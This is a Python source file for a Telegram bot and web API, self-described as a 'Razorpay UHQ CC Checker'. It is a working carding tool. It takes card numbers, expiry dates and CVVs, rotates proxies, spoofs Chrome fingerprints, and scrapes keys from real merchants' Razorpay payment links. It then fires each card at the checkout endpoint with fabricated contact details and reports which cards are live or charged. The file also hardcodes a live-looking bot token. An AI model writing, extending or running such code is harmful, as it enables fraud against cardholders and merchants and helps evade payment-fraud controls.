import asyncio
import json
import time
import re
import random
import hashlib
import uuid
import logging
import os
from threading import Thread
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import uvicorn

from curl_cffi.requests import AsyncSession

from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    MessageHandler,
    CommandHandler,
    filters
)

TELEGRAM_BOT_TOKEN = "8031306974:AAFUlWwpvWDSeFDM3pjvDDv0_vo2l95wk5U"

# Default Proxies Preloaded
RAW_PROXIES = [
    "in-free-proxy.g-w.info:59783",
    "px241104.pointtoserver.com:10780",
    "px400501.pointtoserver.com:10780",
    "px023005.pointtoserver.com:10780",
    "px051003.pointtoserver.com:10780",
    "px040805.pointtoserver.com:10780",
    "px040805.pointtoserver.com:10780"
]

PROXY_FAIL_COUNTS = {}
MAX_PROXY_FAILS = 3

RAZORPAY_URLS = [
    "https://razorpay.me/@onsiteteams",
    "https://razorpay.me/@getitservice",
    "https://pages.razorpay.com/payonline",
    "https://razorpay.me/@plp",
    "https://axiseasypay.razorpay.com/wallets/"
]

proxy_index = 0
url_index = 0

logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

api_app = FastAPI(title="Razorpay CC Checker API", version="16.0")

class CardRequest(BaseModel):
    cc: str
    mm: str
    yy: str
    cvv: str
    amount: int = 1

@api_app.get("/")
async def root():
    return {"status": "Bot is active and running 24/7!", "active_proxies": len(RAW_PROXIES)}

def format_proxy(raw):
    if not raw: 
        return None
    
    raw = raw.strip().replace('"', '').replace("'", "").replace("\r", "")
    if not raw: 
        return None

    if "://" not in raw:
        parts = raw.split(":")
        if len(parts) == 4:
            if parts[1].isdigit() and int(parts[1]) < 65536:
                return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            elif parts[3].isdigit() and int(parts[3]) < 65536:
                return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
            else:
                return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2:
            return f"http://{raw}"
    
    return raw

async def test_proxy(raw_proxy):
    formatted = format_proxy(raw_proxy)
    if not formatted:
        return False, "Invalid proxy format"
    try:
        async with AsyncSession(impersonate="chrome120") as session:
            resp = await session.get("https://razorpay.me/@onsiteteams", proxy=formatted, timeout=12)
            if resp.status_code in [200, 301, 302, 403]:
                return True, "Proxy is Live & Reachable"
    except Exception as e:
        return False, str(e)[:40]
    return False, "Connection timeout or refused"

def get_rotating_url():
    global url_index
    u = RAZORPAY_URLS[url_index % len(RAZORPAY_URLS)]
    url_index += 1
    return u

def extract_embedded_json(text):
    tag = "var data ="
    pos = text.find(tag)
    if pos != -1:
        start = pos + len(tag)
        while start < len(text) and text[start] in [' ', '\t', '\n', '\r']: start += 1
        if start < len(text) and text[start] == '{':
            depth, in_str, escaped = 0, False, False
            for i in range(start, len(text)):
                c = text[i]
                if escaped: escaped = False; continue
                if c == '\\' and in_str: escaped = type(not escaped) and False; continue
                if c == '"': in_str = not in_str; continue
                if in_str: continue
                if c == '{': depth += 1
                elif c == '}':
                    depth -= 1
                    if depth == 0: return text[start:i+1]

    key_match = re.search(r'["\']key_id["\']\s*:\s*["\'](rzp_live_[a-zA-Z0-9]+)["\']', text)
    link_match = re.search(r'["\']id["\']\s*:\s*["\'](plink_[a-zA-Z0-9]+)["\']', text)
    item_match = re.search(r'["\']payment_page_item_id["\']\s*:\s*["\'](ppgi_[a-zA-Z0-9]+)["\']', text)
    
    if key_match:
        simulated_json = {
            "key_id": key_match.group(1),
            "payment_link": {
                "id": link_match.group(1) if link_match else "plink_dummy",
                "payment_page_items": [{"id": item_match.group(1) if item_match else "ppgi_dummy"}]
            },
            "keyless_header": ""
        }
        return json.dumps(simulated_json)

    return None

async def fetch_dynamic_builds(session, proxy_url):
    try:
        resp = await session.get(
            "https://api.razorpay.com/v1/checkout/public?traffic_env=production&checkout_v2=1",
            proxy=proxy_url,
            impersonate="chrome120",
            timeout=20
        )
        text = resp.text
        build_match = re.search(r'build[\'"]?\s*[:=]\s*[\'"]([a-fA-F0-9]{32,})[\'"]', text)
        build_v1_match = re.search(r'build_v1[\'"]?\s*[:=]\s*[\'"]([a-fA-F0-9]{32,})[\'"]', text)
        return (
            build_match.group(1) if build_match else "9cb57fdf457e44eac4384e182f925070ff5488d9",
            build_v1_match.group(1) if build_v1_match else "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
        )
    except Exception:
        return "9cb57fdf457e44eac4384e182f925070ff5488d9", "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"

async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_callback=None):
    if not RAW_PROXIES:
        return {"status": "error", "response": "No proxies added! Use /proxy first.", "proxy": "NONE"}

    phone = "+91" + random.choice(["6", "7", "8", "9"]) + "".join([str(random.randint(0, 9)) for _ in range(9)])
    email = f"user_{random.randint(1000,9999)}@gmail.com"

    yy_formatted = yy[2:] if len(yy) == 4 else yy
    try:
        year = int("20" + yy_formatted)
    except:
        year = 2030
        
    amount_paise = amount * 100

    device_id = f"1.{hashlib.sha1(uuid.uuid4().bytes).hexdigest()}.{int(time.time()*1000)}.{random.randint(0,99999999):08d}"
    session_id = "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=14))

    async def notify(proxy_st, api_st, gw_resp):
        if status_callback:
            await status_callback(proxy_st, api_st, gw_resp)

    active_pool = [p for p in RAW_PROXIES if PROXY_FAIL_COUNTS.get(p, 0) < MAX_PROXY_FAILS]
    if not active_pool:
        PROXY_FAIL_COUNTS.clear()
        active_pool = RAW_PROXIES

    max_attempts = min(len(active_pool), 3)
    
    for _ in range(max_attempts):
        current_raw_proxy = random.choice(active_pool)
        current_proxy = format_proxy(current_raw_proxy)
        
        if not current_proxy:
            continue

        proxy_short = current_raw_proxy.split("@")[-1].split(":")[0] if current_raw_proxy else "PROXY"
        target_url = get_rotating_url()
        site_name = target_url.split("//")[-1].split("/")[0][:15]

        try:
            await notify(f"({proxy_short})", f"Site: {site_name}", "Init")
            
            async with AsyncSession(impersonate="chrome120") as session:
                
                async def proxy_request(method, url, **kwargs):
                    return await session.request(method, url, proxy=current_proxy, timeout=20, **kwargs)

                await proxy_request("GET", target_url)
                await asyncio.sleep(0.2)

                resp = await proxy_request("GET", target_url)
                if resp.status_code != 200:
                    raise Exception(f"HTTP {resp.status_code}")
                
                html_body = resp.text
                config_json = extract_embedded_json(html_body)
                if not config_json:
                    raise Exception("Config JSON not found")

                parsed = json.loads(config_json)
                key_id = parsed.get("key_id")
                if not key_id:
                    raise Exception("Key ID missing")

                link_id, item_id = "", ""
                for k in ["payment_link", "payment_page"]:
                    if k in parsed and isinstance(parsed[k], dict):
                        link_id = parsed[k].get("id")
                        items = parsed[k].get("payment_page_items", [])
                        if items: item_id = items[0].get("id")
                        break

                if not link_id:
                    raise Exception("Link ID missing")

                await notify(f"({proxy_short})", "Page Parsed!", "Creating Order...")
                keyless_hdr = parsed.get("keyless_header", "")

                BUILD, BUILD_V1 = await fetch_dynamic_builds(session, current_proxy)

                order_payload = {
                    "notes": {"comment": "", "name": "User"},
                    "line_items": [{"payment_page_item_id": item_id, "amount": amount_paise}]
                }
                order_resp = await proxy_request(
                    "POST", f"https://api.razorpay.com/v1/payment_pages/{link_id}/order",
                    json=order_payload,
                    headers={"Origin": "https://pages.razorpay.com", "Referer": "https://pages.razorpay.com/"}
                )
                order_res = order_resp.json()

                order_obj = order_res.get("order", {})
                order_id = order_obj.get("id")
                if not order_id:
                    raise Exception("Order creation failed")

                checkout_ref = order_id.split("_")[1] if "_" in order_id else order_id
                currency = order_obj.get("currency", "INR")

                await notify(f"({proxy_short})", "Order Created!", "Getting Token...")

                token_params = {
                    "traffic_env": "production", "build": BUILD, "build_v1": BUILD_V1,
                    "checkout_v2": "1", "new_session": "1", "keyless_header": keyless_hdr,
                    "rzp_device_id": device_id, "unified_session_id": session_id
                }
                token_resp = await proxy_request("GET", "https://api.razorpay.com/v1/checkout/public", params=token_params)
                public_text = token_resp.text

                token_match = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', public_text, re.IGNORECASE)
                if not token_match: token_match = re.search(r'window\.session_token="([^"]+)"', public_text)
                if not token_match:
                    raise Exception("Session token missing")
                
                session_token = token_match.group(1)
                referer_url = f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={session_id}&session_token={session_token}"

                await notify(f"({proxy_short})", "Submitting Card (Ajax)", "Checking CC...")

                form_data = {
                    "notes[comment]": "", "notes[email]": email, "notes[phone]": phone[3:], "notes[name]": "User",
                    "payment_link_id": link_id, "key_id": key_id, "contact": phone, "email": email,
                    "currency": currency, "_[integration]": "payment_pages", "_[checkout_id]": checkout_ref,
                    "_[device.id]": device_id, "_[library]": "checkoutjs", "_[platform]": "browser",
                    "amount": str(amount_paise), "order_id": order_id, "method": "card",
                    "card[number]": cc, "card[cvv]": cvv, "card[name]": "User",
                    "card[expiry_month]": mm, "card[expiry_year]": str(year), "save": "0", "dcc_currency": currency
                }

                ajax_headers = {
                    "Origin": "https://api.razorpay.com", "Referer": referer_url,
                    "x-session-token": session_token, "Content-Type": "application/x-www-form-urlencoded"
                }

                pay_resp = await proxy_request(
                    "POST", f"https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id={order_id}&session_token={session_token}&keyless_header={keyless_hdr}",
                    data=form_data, headers=ajax_headers
                )
                payment_res = pay_resp.json()

                PROXY_FAIL_COUNTS[current_raw_proxy] = 0

                payment_id = payment_res.get("payment_id") or payment_res.get("id")
                if not payment_id:
                    err_block = payment_res.get("error", {})
                    err_desc = err_block.get("description", "Declined")
                    err_reason = err_block.get("reason", "")
                    reason_full = f"{err_desc} ({err_reason})" if err_reason else err_desc
                    
                    desc_lower = err_desc.lower()
                    if any(k in desc_lower for k in ["insufficient account balance", "insufficient funds", "limit"]) or "incorrect_cvv" in err_reason.lower():
                        await notify(f"({proxy_short})", "Gateway Response", f"Approved: {reason_full}")
                        return {"status": "approved", "response": reason_full, "proxy": proxy_short}
                    
                    await notify(f"({proxy_short})", "Gateway Response", f"Declined: {reason_full}")
                    return {"status": "declined", "response": reason_full, "proxy": proxy_short}

                await notify(f"({proxy_short})", "Gateway Response", "Charged Successfully!")
                return {"status": "charged", "response": "Payment Successful", "proxy": proxy_short}

        except Exception as e:
            PROXY_FAIL_COUNTS[current_raw_proxy] = PROXY_FAIL_COUNTS.get(current_raw_proxy, 0) + 1
            logger.warning(f"⚠️ Proxy {proxy_short} failed: {str(e)[:35]}. Switching proxy...")
            await asyncio.sleep(0.4)
            continue

    return {"status": "error", "response": "All proxy attempts timed out or failed", "proxy": "PROXY"}

@api_app.post("/api/check")
async def api_check(req: CardRequest):
    return await process_card_pipeline_with_logs(req.cc, req.mm, req.yy, req.cvv, req.amount)

# --- TELEGRAM COMMANDS ---

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚡ **Razorpay UHQ CC Checker Bot is Online!**\n\n"
        "• Send a `.txt` file with `/msa` or drop a single card to start checking.\n"
        "• Use `/proxy` to add single proxy or `/proxyadd` for bulk proxies.",
        parse_mode="Markdown"
    )

async def proxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "⚡ **Proxy Manager Menu**\n\n"
            "⚡ `/proxy host:port:user:pass` (Test & Add Single Proxy)\n"
            "⚡ `/proxyadd` (Bulk Add Proxies line-by-line)\n"
            "⚡ `/myproxy` (View Active Proxies)\n"
            "⚡ `/rmproxy <number>` (Remove Proxy)",
            parse_mode="Markdown"
        )
        return
    
    raw_input = context.args[0].strip()
    status_msg = await update.message.reply_text("🔍 Testing proxy live connectivity with Razorpay...")
    
    success, info = await test_proxy(raw_input)
    if success:
        if raw_input not in RAW_PROXIES:
            RAW_PROXIES.append(raw_input)
        await status_msg.edit_text(
            f"✅ **Proxy Verified & Added Successfully!**\n"
            f"▸ Proxy: `{raw_input}`\n"
            f"▸ Status: `{info}`\n"
            f"▸ Total Active Proxies: {len(RAW_PROXIES)}",
            parse_mode="Markdown"
        )
    else:
        await status_msg.edit_text(
            f"❌ **Proxy Test Failed (Dead Proxy)!**\n"
            f"▸ Reason: `{info}`\n"
            f"▸ Proxy was NOT added.",
            parse_mode="Markdown"
        )

async def proxyadd_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    lines = text.splitlines()
    
    proxy_lines = [l.strip() for l in lines[1:] if l.strip()]
    if not proxy_lines and context.args:
        proxy_lines = [arg.strip() for arg in context.args if arg.strip()]

    if not proxy_lines:
        await update.message.reply_text(
            "⚠️ **Bulk Proxy Add Usage:**\n\n"
            "Type `/proxyadd` and paste your proxies line-by-line like this:\n\n"
            "`/proxyadd`\n"
            "`host1:port:user:pass`\n"
            "`host2:port:user:pass`\n"
            "`host3:port:user:pass`",
            parse_mode="Markdown"
        )
        return

    status_msg = await update.message.reply_text(f"🔍 Testing {len(proxy_lines)} proxies live against Razorpay... Please wait.")
    
    added_count = 0
    failed_count = 0
    results_log = []

    async def test_and_add(p):
        nonlocal added_count, failed_count
        success, info = await test_proxy(p)
        if success:
            if p not in RAW_PROXIES:
                RAW_PROXIES.append(p)
            added_count += 1
            results_log.append(f"✅ `{p}`")
        else:
            failed_count += 1
            results_log.append(f"❌ `{p}` (Dead)")

    tasks = [test_and_add(p) for p in proxy_lines]
    await asyncio.gather(*tasks)

    summary = (
        f"📊 **Bulk Proxy Add Report:**\n\n"
        f"✅ Added Successfully (Live): {added_count}\n"
        f"❌ Dead / Failed: {failed_count}\n"
        f"🛡️ Total Active Proxies: {len(RAW_PROXIES)}\n\n"
        f"**Results Preview:**\n" + "\n".join(results_log[:15])
    )
    if len(results_log) > 15:
        summary += f"\n*(and {len(results_log) - 15} more...)*"

    await status_msg.edit_text(summary, parse_mode="Markdown")

async def myproxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not RAW_PROXIES:
        await update.message.reply_text("⚠️ No active proxies saved yet. Use `/proxy` or `/proxyadd` to add them.", parse_mode="Markdown")
        return
    
    text = f"🌐 **Your Proxies ({len(RAW_PROXIES)})**\n\n"
    for idx, p in enumerate(RAW_PROXIES, 1):
        text += f"{idx}. `{p}`\n"
    await update.message.reply_text(text, parse_mode="Markdown")

async def rmproxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not RAW_PROXIES:
        await update.message.reply_text("⚠️ No proxies to remove.", parse_mode="Markdown")
        return
    
    if not context.args:
        text = "⚠️ **Usage:** `/rmproxy <number>`\n\nActive Proxies:\n"
        for idx, p in enumerate(RAW_PROXIES, 1):
            text += f"{idx}. `{p}`\n"
        await update.message.reply_text(text, parse_mode="Markdown")
        return
    
    try:
        idx = int(context.args[0]) - 1
        if 0 <= idx < len(RAW_PROXIES):
            removed = RAW_PROXIES.pop(idx)
            await update.message.reply_text(f"🗑️ Successfully removed proxy:\n`{removed}`\nRemaining Proxies: {len(RAW_PROXIES)}", parse_mode="Markdown")
        else:
            await update.message.reply_text("⚠️ Invalid proxy number.", parse_mode="Markdown")
    except ValueError:
        await update.message.reply_text("⚠️ Please provide a valid number. Example: `/rmproxy 1`", parse_mode="Markdown")

def format_time(sec):
    m, s = divmod(sec, 60)
    return f"{m}m {s}s" if m > 0 else f"{s}s"

async def msa_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not RAW_PROXIES:
        await update.message.reply_text("⚠️ Please add at least one proxy first using `/proxy` or `/proxyadd`!", parse_mode="Markdown")
        return

    doc = update.message.document or (update.message.reply_to_message and update.message.reply_to_message.document)
    if not doc:
        await update.message.reply_text("⚠️ Please send or reply to a `.txt` file with `/msa`.")
        return

    status_msg = await update.message.reply_text("📂 Initializing Persistent Console...")

    try:
        file = await context.bot.get_file(doc.file_id)
        lines = (await file.download_as_bytearray()).decode('utf-8', errors='ignore').splitlines()
        cards = []
        for line in lines:
            line = line.strip()
            if not line: continue
            for sep in ["|", "/", " "]:
                p = line.split(sep)
                if len(p) >= 4:
                    cards.append((p[0], p[1], p[2], p[3]))
                    break
    except Exception as e:
        await status_msg.edit_text(f"⚠️ Error reading file: {e}")
        return

    total = len(cards)
    start_time = time.time()
    approved, charged, dead, errors = 0, 0, 0, 0
    
    current_proxy_status = "Connecting..."
    current_api_status = "Initializing..."
    current_gateway_response = "Waiting..."
    username = f"@{update.effective_user.username}" if update.effective_user.username else "User"

    for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
        masked_cc = f"{cc[:6]}******{cc[-4:]}"
        
        async def update_screen(proxy_st, api_st, gw_resp):
            nonlocal current_proxy_status, current_api_status, current_gateway_response
            current_proxy_status = proxy_st
            current_api_status = api_st
            current_gateway_response = gw_resp
            time_elapsed = int(time.time() - start_time)
            
            console_text = (
                f"╔════════════════════════════════════╗\n"
                f"║ 🟢 RAZORPAY UHQ CC CHECKER         ║\n"
                f"╠════════════════════════════════════╣\n"
                f"║ 📊 Progress  : {idx}/{total:<19} ║\n"
                f"║ 🛡️ Proxy IP  : {current_proxy_status:<19} ║\n"
                f"║ 🔗 API Hit   : {current_api_status:<19} ║\n"
                f"║ 💳 Card Proc : {masked_cc:<19} ║\n"
                f"║ 💬 Gateway   : {current_gateway_response[:17]:<17} ║\n"
                f"║ ⏱️ Elapsed   : {format_time(time_elapsed):<19} ║\n"
                f"╠════════════════════════════════════╣\n"
                f"║ ⭐ Approved: {approved:<5} | 💳 Charged: {charged:<5} ║\n"
                f"║ ❌ Dead    : {dead:<5}  | ⚠️ Errors  : {errors:<5} ║\n"
                f"╚════════════════════════════════════╝"
            )
            try:
                await status_msg.edit_text(f"```text\n{console_text}\n```", parse_mode="Markdown")
            except:
                pass

        while True:
            await update_screen("Connecting...", "Preparing Request...", "Checking...")
            res = await process_card_pipeline_with_logs(cc, mm, yy, cvv, status_callback=update_screen)
            status, resp_msg, proxy_used = res["status"], res["response"], res["proxy"]

            if status == "error":
                errors += 1
                await update_screen(f"({proxy_used})", "Network Error - Retrying CC...", "Rechecking...")
                await asyncio.sleep(1.0)
                continue
            
            if status == "charged":
                charged += 1
                approved += 1
            elif status == "approved":
                approved += 1
            elif status == "declined":
                dead += 1
            
            break

        if status in ["charged", "approved"]:
            await update.message.reply_text(
                f"◎  **{status.capitalize()} · Razorpay UHQ**\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"▸ num  · `{cc}|{mm}|{yy}|{cvv}`\n"
                f"▸ gate · Razorpay Multi-Site\n"
                f"▸ resp · {resp_msg}\n"
                f"▸ user · {username}\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"▸ proxy· {proxy_used}",
                parse_mode="Markdown"
            )

        await asyncio.sleep(0.3)

    final_text = (
        f"╔════════════════════════════════════╗\n"
        f"║ 🏁 CHECKING SESSION FINISHED 🏁    ║\n"
        f"╠════════════════════════════════════╣\n"
        f"║ 📊 Total Checked: {total:<19} ║\n"
        f"║ ⭐ Approved    : {approved:<19} ║\n"
        f"║ 💳 Charged     : {charged:<19} ║\n"
        f"║ ❌ Dead        : {dead:<19} ║\n"
        f"║ ⚠️ Errors      : {errors:<19} ║\n"
        f"║ 🕒 Total Time  : {format_time(int(time.time() - start_time)):<19} ║\n"
        f"╚════════════════════════════════════╝"
    )
    await status_msg.edit_text(f"```text\n{final_text}\n```", parse_mode="Markdown")

async def handle_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text or update.message.text.startswith('/'):
        return

    if not RAW_PROXIES:
        await update.message.reply_text("⚠️ Please add a proxy first using `/proxy` or `/proxyadd` before checking cards!", parse_mode="Markdown")
        return

    raw = update.message.text.strip()
    parts = None
    for sep in ["|", "/", " "]:
        p = raw.split(sep)
        if len(p) >= 4:
            parts = p
            break

    if not parts: return

    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    username = f"@{update.effective_user.username}" if update.effective_user.username else "User"

    wait_msg = await update.message.reply_text(f"⏳ Processing single card persistently...", parse_mode="Markdown")

    async def single_update(p_st, a_st, g_resp):
        try:
            await wait_msg.edit_text(f"⚡ **Status:** Proxy: `{p_st}` | API: `{a_st}` | Resp: `{g_resp}`", parse_mode="Markdown")
        except: pass

    while True:
        res = await process_card_pipeline_with_logs(cc, mm, yy, cvv, status_callback=single_update)
        status, resp_msg, proxy_used = res["status"], res["response"], res["proxy"]
        if status != "error":
            break
        await asyncio.sleep(1.0)

    if status in ["charged", "approved"]:
        reply = (
            f"◎  **{status.capitalize()} · Razorpay UHQ**\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"▸ num  · `{cc}|{mm}|{yy}|{cvv}`\n"
            f"▸ gate · Razorpay Multi-Site\n"
            f"▸ resp · {resp_msg}\n"
            f"▸ user · {username}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"▸ proxy· {proxy_used}"
        )
        await wait_msg.edit_text(reply, parse_mode="Markdown")
    else:
        await wait_msg.edit_text(f"ⓧ **Declined / Dead**\n▸ num: `{cc}|{mm}|{yy}|{cvv}`\n▸ resp: {resp_msg}", parse_mode="Markdown")

def run_fastapi_server():
    port = int(os.getenv("PORT", 7070))
    uvicorn.run(api_app, host="0.0.0.0", port=port, log_level="warning")

def main():
    server_thread = Thread(target=run_fastapi_server, daemon=True)
    server_thread.start()

    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("proxy", proxy_cmd))
    app.add_handler(CommandHandler("proxyadd", proxyadd_cmd))
    app.add_handler(CommandHandler("myproxy", myproxy_cmd))
    app.add_handler(CommandHandler("rmproxy", rmproxy_cmd))
    app.add_handler(CommandHandler("msa", msa_cmd))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_single_card))
    
    logger.info("Starting Razorpay CC Checker Bot + API Engine...")
    app.run_polling()

if __name__ == "__main__":
    main()
